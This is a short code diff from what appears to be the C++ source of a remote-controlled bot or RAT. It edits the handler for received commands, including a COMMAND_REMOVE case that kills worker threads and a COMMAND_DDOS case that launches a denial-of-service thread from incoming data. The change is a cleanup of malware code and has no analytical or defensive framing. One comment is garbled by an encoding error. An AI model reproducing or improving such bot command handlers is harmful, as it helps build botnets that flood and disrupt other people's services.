@@ -120,8 +120,7 @@ void CMyKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 
 	case COMMAND_REMOVE: // п╤ть,
-		unsigned int i;
-		for (i = 0; i < m_nThreadCount; i++)
+		for (unsigned int i = 0; i < m_nThreadCount; i++)
 		{
 			TerminateThread(m_hThread[i], -1);
 			CloseHandle(m_hThread[i]);
@@ -161,6 +160,8 @@ void CMyKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 
 	case COMMAND_DDOS: // DDOS
 		m_hThread[m_nThreadCount++] = CreateThread(NULL, 0, Loop_MyTools, (LPVOID)(lpBuffer), 0, NULL);
+		break;
+	default:
 		break;
 	}
 }
